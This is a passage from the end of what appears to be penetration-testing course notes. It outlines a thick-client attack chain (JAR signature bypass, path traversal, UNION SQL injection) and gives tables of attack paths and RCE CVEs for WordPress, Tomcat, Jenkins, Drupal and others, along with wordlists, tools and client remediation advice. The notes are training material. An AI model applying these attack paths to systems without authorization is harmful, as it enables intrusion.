  Click ServerStatus
  Click Ipconfig (NOT uname — that's a common mistake)
  Look for eth0 interface line
  The inet value (e.g., 172.17.0.2) is the answer

### Key Attack Chain

Anonymous FTP → JAR + notes
        ↓
Update port + bypass JAR signature
        ↓
Login as qtc
        ↓
Enumerate → dave.txt hints at SQLi
        ↓
Path traversal via modified client
        ↓
Download fatty-server.jar
        ↓
Decompile → find SQLi
        ↓
Modify client to send plaintext password
        ↓
UNION SQLi → login as admin
        ↓
Read eth0 IP via ServerStatus → Ipconfig

---

## 16. Key Takeaways

### Universal Attack Chain

1. Discovery → identify version + app type
2. Enumeration → users, plugins, modules, secrets
3. Credential attack → defaults, brute force, reuse
4. RCE → abuse built-in functionality or known CVE
5. Post-exploitation → escalate + pivot

### Common Attack Vectors by App

Application | Primary Attack Path
WordPress | Plugin CVEs, theme editor, XML-RPC brute force
Joomla | Template editor, CVE-2019-10945 traversal
Drupal | PHP filter module, Drupalgeddon 1/2/3
Tomcat | /manager with default creds → WAR upload
Jenkins | Script Console → Groovy RCE
Splunk | Scripted input → reverse shell
PRTG | Notification → Execute Program → command injection
osTicket | Read tickets → leaked credentials
GitLab | CVE-2021-22205 ExifTool RCE
Tomcat CGI | CVE-2019-0232 + URL-encoded bypass
CGI / Shellshock | CVE-2014-6271 via User-Agent
Thick Clients | Hardcoded creds, memory dumps, SQLi, path traversal

### Critical CVEs Reference

CVE | Application | Impact
CVE-2014-6271 | Bash (Shellshock) | Unauthenticated RCE via CGI
CVE-2014-3704 | Drupal | Drupalgeddon (SQLi → admin)
CVE-2018-7600 | Drupal | Drupalgeddon2 (pre-auth RCE)
CVE-2018-7602 | Drupal | Drupalgeddon3 (auth RCE)
CVE-2018-9276 | PRTG | Authenticated command injection
CVE-2019-0232 | Tomcat CGI | Command injection (Windows)
CVE-2019-10945 | Joomla | Directory traversal + file deletion
CVE-2020-1938 | Tomcat AJP | Ghostcat (unauth LFI)
CVE-2020-24186 | wpDiscuz | Unauthenticated file upload → RCE
CVE-2020-24881 | osTicket | SSRF
CVE-2021-22205 | GitLab | ExifTool RCE (≤13.10.2)

### Mindset Principles
- Enumeration is the real weapon — not exploits
- Non-vulnerable apps still provide value — leaked data, creds, emails
- Chain small bugs together — one finding enables the next
- Understand the tool — don't blindly throw exploits
- Document everything — timestamps, syntax, output, artifacts
- Clean up — remove shells and note them in the report
- Always check both webroots and upload folders — decoys are common
- Try case variations — usernames, extensions, encoded payloads
- ipconfig not uname — details matter
- Metasploit when time-boxed — understanding matters more than tool choice

### Client Recommendations Summary
- Limit exposed services
- Enforce MFA on all external portals
- Strong password policies (no common words)
- Security awareness training
- Regular patching + asset inventory
- Encrypt data in transit (TLS)
- Input validation / parameterized queries
- Code obfuscation for thick clients
- Remove signature verification gaps

### Reference Wordlists
- /usr/share/wordlists/rockyou.txt
- /usr/share/seclists/Usernames/cirt-default-usernames.txt
- /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
- /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
- /usr/share/dirb/wordlists/common.txt
- /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

### Tools Used Throughout
- Recon: nmap, ffuf, gobuster, EyeWitness, Aquatone
- CMS: WPScan, droopescan, JoomlaScan, joomla-brute
- Exploitation: Metasploit, searchsploit, msfvenom, Hydra
- Post-Exploitation: crackmapexec, evil-winrm, wmiexec, psexec, nc
- Reverse Engineering: JD-GUI, dnSpy, x64dbg, de4dot, strings, ProcMon
- Web: Burp Suite, curl, Wireshark, tcpdump
